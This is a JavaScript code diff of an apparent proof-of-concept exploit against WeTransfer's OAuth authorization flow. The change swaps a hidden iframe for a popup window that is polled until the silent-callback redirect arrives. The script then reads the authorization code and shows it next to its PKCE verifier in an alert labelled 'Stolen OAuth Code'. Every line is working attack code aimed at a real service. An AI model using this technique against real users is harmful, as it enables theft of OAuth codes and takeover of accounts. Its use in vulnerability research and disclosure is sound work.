@@ -3,19 +3,27 @@
   const h = new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(v)));
   const c = btoa(String.fromCharCode(...h)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
 
-  const f = document.createElement('iframe');
-  f.style.display = 'none';
-  f.src = 'https://auth.wetransfer.com/authorize?response_mode=web_message&prompt=none&client_id=dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc&response_type=code&redirect_uri=https%3A%2F%2Fwetransfer.com%2Faccount%2Fsilent-callback&code_challenge=' + encodeURIComponent(c) + '&code_challenge_method=S256&state=poc';
+  const authUrl = 'https://auth.wetransfer.com/authorize?response_mode=web_message&prompt=none'
+    + '&client_id=dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc'
+    + '&response_type=code'
+    + '&redirect_uri=' + encodeURIComponent('https://wetransfer.com/account/silent-callback')
+    + '&code_challenge=' + encodeURIComponent(c)
+    + '&code_challenge_method=S256'
+    + '&state=poc';
 
-  f.onload = () => {
+  const w = window.open(authUrl);
+
+  const poll = setInterval(() => {
     try {
-      const url = f.contentWindow.location.href;
-      const code = new URLSearchParams(new URL(url).search).get('code');
-      if (code) {
-        alert('Stolen OAuth Code:\n' + code + '\n\nCode Verifier:\n' + v);
+      if (w.location.href.includes('silent-callback')) {
+        clearInterval(poll);
+        const code = new URLSearchParams(new URL(w.location.href).search).get('code');
+        w.close();
+        if (code) {
+          alert('Stolen OAuth Code:\n' + code + '\n\nCode Verifier:\n' + v);
+        }
       }
-    } catch (e) {}
-  };
-
-  document.body.appendChild(f);
+    } catch (e) {
+    }
+  }, 100);
 })();
